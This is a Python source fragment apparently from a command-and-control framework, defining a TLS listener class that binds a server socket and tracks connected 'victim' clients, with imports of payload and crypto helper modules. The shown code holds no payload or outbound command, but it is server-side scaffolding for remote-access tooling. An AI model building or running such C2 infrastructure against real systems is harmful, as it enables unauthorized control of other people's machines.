import socket
import threading
import json
import time
import ssl
from datetime import datetime

from lib.C2P import C2P
from lib.Client import Client
from lib.ColorPrint import ColorPrint as cp
from lib.EZCrypto import PAES, EZRSA, Encoder, PRSA
from lib.Listener import Listener as mainListener
from lib.tool import EZData, EZClass
from lib.EZPayload import get_payload

class Listener:
    def __init__(self, ip: str, port: int, main_listener: mainListener, certfile: str, pemfile: str):
        self.main_listener = main_listener

        self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        self.context.load_cert_chain(certfile=certfile, keyfile=pemfile)

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) # TCP
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        ip = '0.0.0.0' if ip == '*' else ip

        sock.bind((ip, port))

        self.sock = sock

        self.bListen = sock.fileno() != -1

        self.msg_handler = None

        '''
        Dictionary format:
            Key: ID
            Value: class Client
        '''

        self.dic_victim = {}

    def start(self):
        self.sock.listen(10000)

    def stop(self):
        pass

    def combine_bytes(self, abFirst: bytes, nIdxFirst: int, nLenFirst: int, abSecond: bytes, nIdxSecond: int, nLenSecond: int) -> bytes:
        return abFirst[nIdxFirst:nIdxFirst + nLenFirst] + abSecond[nIdxSecond:nIdxSecond + nLenSecond]
    
